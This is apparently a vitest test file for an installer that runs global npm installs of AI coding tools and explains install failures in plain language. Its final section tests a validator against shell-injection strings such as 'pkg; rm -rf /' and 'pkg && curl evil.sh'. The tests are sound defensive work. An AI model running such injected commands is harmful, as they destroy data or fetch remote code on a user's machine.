import { describe, expect, it, vi } from 'vitest'

import { installCommand } from '../shared/runtime-install.js'
import {
  classifyInstallFailure,
  createRuntimeInstaller,
  installedButNotFound,
  safeToSpawn
} from './runtime-installer.js'

/**
 * What a person sees when the install button does not work.
 *
 * The happy path is one line of npm output and a green dot. Everything below
 * is the rest of it, which is most of the design: a person who cannot read an
 * npm trace still has to know what happened and what to do, and the command
 * has to stay reachable so they -- or someone helping them -- can run it by
 * hand.
 */

const runner = (result: { code: number | null; output: string }, lines: readonly string[] = []) =>
  vi.fn(async (_command: string, _args: readonly string[], onLine: (line: string) => void) => {
    for (const line of lines) onLine(line)
    return result
  })

describe('running the install the screen showed', () => {
  it('runs exactly the command the person read, not a reconstruction of it', async () => {
    // The line on screen and the argv spawned here come from one place. If
    // they could drift, the app would be showing one thing and doing another.
    const run = runner({ code: 0, output: 'added 213 packages' })
    const installer = createRuntimeInstaller({ run, nowInstalled: async () => true })
    await installer.install({ runtime: 'opencode', onLine: () => undefined })
    expect(run).toHaveBeenCalledWith('npm', ['install', '-g', 'opencode-ai'], expect.any(Function))
  })

  it('hands every line npm prints to the screen as it arrives', async () => {
    const seen: string[] = []
    const installer = createRuntimeInstaller({
      run: runner({ code: 0, output: '' }, ['npm warn deprecated x', 'added 213 packages in 12s']),
      nowInstalled: async () => true
    })
    await installer.install({ runtime: 'opencode', onLine: ({ line }) => seen.push(line) })
    expect(seen).toEqual(['npm warn deprecated x', 'added 213 packages in 12s'])
  })

  it('refuses a second install while one is running', async () => {
    // One at a time, so a single output line belongs to a single install.
    let release: () => void = () => undefined
    const installer = createRuntimeInstaller({
      run: vi.fn(async () => {
        await new Promise<void>((resolve) => { release = resolve })
        return { code: 0, output: '' }
      }),
      nowInstalled: async () => true
    })
    const first = installer.install({ runtime: 'opencode', onLine: () => undefined })
    expect(installer.busy()).toBe(true)
    const second = await installer.install({ runtime: 'claude', onLine: () => undefined })
    expect(second.ok).toBe(false)
    if (!second.ok) expect(second.what).toContain('already running')
    release()
    await first
    expect(installer.busy()).toBe(false)
  })

  it('will not offer to install something that does not come from a package manager', async () => {
    const installer = createRuntimeInstaller({ run: runner({ code: 0, output: '' }) })
    const outcome = await installer.install({ runtime: 'cursor', onLine: () => undefined })
    expect(outcome.ok).toBe(false)
  })
})

describe('a clean exit is not the same as something to run', () => {
  it('says so when npm succeeded and the command still is not there', async () => {
    // The half-written install. Detected by asking the machine again, not
    // guessed at -- which is the only reason it can be reported at all.
    const installer = createRuntimeInstaller({
      run: runner({ code: 0, output: 'added 1 package' }),
      nowInstalled: async () => false
    })
    const outcome = await installer.install({ runtime: 'opencode', onLine: () => undefined })
    expect(outcome.ok).toBe(false)
    if (!outcome.ok) {
      expect(outcome.what).toContain('still cannot find')
      // Restarting is the action here, not running the command again.
      expect(outcome.restart).toBe(true)
    }
  })

  it('reports success when the command really is there afterwards', async () => {
    // The control: without it, "not found" above is satisfied by an installer
    // that never reports success at all.
    const installer = createRuntimeInstaller({
      run: runner({ code: 0, output: 'added 1 package' }),
      nowInstalled: async () => true
    })
    expect(await installer.install({ runtime: 'opencode', onLine: () => undefined })).toEqual({ ok: true })
  })
})

describe('the six ways an install fails, each said in a person’s words', () => {
  const classify = (output: string) =>
    classifyInstallFailure({
      packageName: 'opencode-ai',
      displayName: 'OpenCode',
      code: 1,
      output,
      seconds: 9
    })

  it('no network', () => {
    expect(classify('npm error code ENOTFOUND\nnpm error getaddrinfo ENOTFOUND registry.npmjs.org').what).toContain(
      'could not reach the registry'
    )
  })

  it('a proxy refusing, which also looks like a network failure and is not', () => {
    // Deliberately ordered ahead of the network case: a proxy failure usually
    // matches both, and naming the proxy is the more useful of the two.
    const seen = classify('npm error tunneling socket could not be established, statusCode=407\nECONNRESET')
    expect(seen.ok).toBe(false)
    if (!seen.ok) {
      expect(seen.what).toContain('refused the connection')
      expect(seen.next).toContain('proxy')
    }
  })

  it('permissions', () => {
    expect(classify('npm error code EACCES\nnpm error syscall mkdir').what).toContain('global folder')
  })

  it('the package itself', () => {
    const seen = classify('npm error code E404\nnpm error 404 Not Found')
    if (!seen.ok) expect(seen.what).toContain('opencode-ai')
  })

  it('anything else, with the elapsed time rather than a guess at the cause', () => {
    const seen = classify('npm error something nobody has seen before')
    if (!seen.ok) {
      expect(seen.what).toContain('9s')
      expect(seen.next).toContain('output')
    }
  })

  it('and the one that is not npm’s fault at all', () => {
    const seen = installedButNotFound('OpenCode')
    if (!seen.ok) {
      expect(seen.what).toContain('OpenCode installed')
      expect(seen.restart).toBe(true)
    }
  })

  it('every failure says both what happened and what to do', () => {
    // The control for the whole table: a classifier that returned a blank
    // second sentence would pass every case above.
    for (const output of ['ENOTFOUND', '407 proxy', 'EACCES', 'E404', 'who knows']) {
      const seen = classify(output)
      expect(seen.ok).toBe(false)
      if (!seen.ok) {
        expect(seen.what.length).toBeGreaterThan(10)
        expect(seen.next.length).toBeGreaterThan(10)
      }
    }
  })
})

describe('a permission failure offers the remedy, not a re-run of itself', () => {
  // The screen used to say "Run the command below in a terminal with
  // permission to install global packages" and show `npm install -g <pkg>` --
  // which fails identically in a terminal, because the problem is not the
  // terminal, it is that npm's global prefix is not writable by this user. A
  // first outside tester got out only by knowing to set a prefix themselves:
  // "A new user who does not already know npm prefixes is stuck" (2026-09-07).
  const eacces = (platform: NodeJS.Platform) =>
    classifyInstallFailure({
      packageName: 'opencode-ai',
      displayName: 'OpenCode',
      code: 243,
      output: 'npm ERR! code EACCES\nnpm ERR! syscall mkdir',
      seconds: 3,
      platform
    })

  it('sets a prefix the user owns, then installs', () => {
    const failure = eacces('linux')
    expect(failure.command).toContain('npm config set prefix')
    expect(failure.command).toContain('~/.npm-global')
    expect(failure.command).toContain('npm install -g opencode-ai')
  })

  it('uses a Windows-shaped path on Windows', () => {
    expect(eacces('win32').command).toContain('%LOCALAPPDATA%')
  })

  it('says to put it on PATH, because installing is only half of it', () => {
    expect(eacces('linux').next).toMatch(/PATH/)
  })

  it('no longer tells them to re-run the thing that just failed', () => {
    expect(eacces('linux').next).not.toMatch(/terminal with permission/i)
  })

  it('leaves every other failure showing the command Locust ran', () => {
    const offline = classifyInstallFailure({
      packageName: 'opencode-ai',
      displayName: 'OpenCode',
      code: 1,
      output: 'npm ERR! network request to https://registry.npmjs.org failed, reason: getaddrinfo ENOTFOUND',
      seconds: 2,
      platform: 'linux'
    })
    expect(offline.command).toBeUndefined()
  })
})

/**
 * The install spawns through a shell -- `shell: true`, because Windows will
 * not start `npm.cmd` any other way. That is not going to change, so what is
 * checked here is the other half: that nothing shaped like shell syntax can
 * reach it.
 *
 * Nothing today can fail these. Every install argument comes from a constant
 * table. The tests exist so that stays true after the table stops being
 * constant -- the failure they are built to catch is a future package name
 * read from a config file or typed by a person.
 */
describe('what may be handed to the install shell', () => {
  it('accepts the shapes a real npm install needs', () => {
    for (const token of [
      'npm',
      'install',
      '-g',
      'opencode-ai',
      '@anthropic-ai/claude-code',
      '@openai/codex',
      'some.pkg_v2',
      'npm:alias@1.2.3'
    ]) {
      expect(safeToSpawn(token)).toBe(true)
    }
  })

  it('refuses every character a shell would read as syntax', () => {
    for (const token of [
      'pkg; rm -rf /',
      'pkg && curl evil.sh',
      'pkg | tee out',
      'pkg $(whoami)',
      'pkg `whoami`',
      'pkg > file',
      'pkg\nnext-line',
      'pkg with space',
      "pkg'quoted'",
      'pkg"quoted"',
      '' // an empty token is not a package, and `npm install ""` is not a plan
    ]) {
      expect(safeToSpawn(token)).toBe(false)
    }
  })

  it('passes every install line the app can actually build today', () => {
    // If a new runtime ever needs a package name this rejects, it fails here
    // -- at a test -- rather than at a shell on someone's machine.
    for (const runtime of ['opencode', 'claude', 'codex', 'copilot']) {
      const line = installCommand(runtime)
      expect(line, runtime).toBeDefined()
      for (const token of (line as string).split(' ')) {
        expect(safeToSpawn(token), `${runtime}: ${token}`).toBe(true)
      }
    }
  })
})
